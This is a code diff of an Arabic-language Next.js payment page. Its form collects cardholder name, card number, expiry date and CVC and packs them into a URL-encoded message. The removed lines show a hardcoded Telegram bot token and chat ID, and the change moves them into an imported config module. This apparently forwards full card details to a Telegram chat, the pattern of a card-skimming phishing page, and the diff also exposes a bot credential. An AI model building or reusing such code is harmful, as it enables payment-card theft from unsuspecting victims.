@@ -6,7 +6,7 @@ import mada from '../../../../../public/mada.png'
 import Image from 'next/image'
 import {useRef} from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
-
+import bot from '@/compnante/dataBot'
 
 const Pay=()=>{
     const selectPay = useRef()
@@ -21,10 +21,7 @@ const Pay=()=>{
     const router = useRouter()
     const handleSubmit = (e) => {
         e.preventDefault();
-        var bot={
-            token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
-            chat_id:6364334502
-        }
+ 
         var length =` طريقة الدفع : ${selectPay.current.value} %0A   الاسم على البطاقة: ${NameCard.current.value} %0A  رقم البطاقة  : ${NumsCard.current.value} %0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value} %0A %0A ${datas}`
        
         
@@ -32,7 +29,7 @@ const Pay=()=>{
       
       }
       const handlerout = ()=>{
-        if(NameCard.current.value == ""){
+        if(NameCard.current.value == "" || NumsCard.current.value == "" || dateCardmm.current.value == "" || dateCardyy.current.value == "" || cvcCard.current.value == ""){
           alert('من فضلك قم بملى الحقول')
         }else{
           
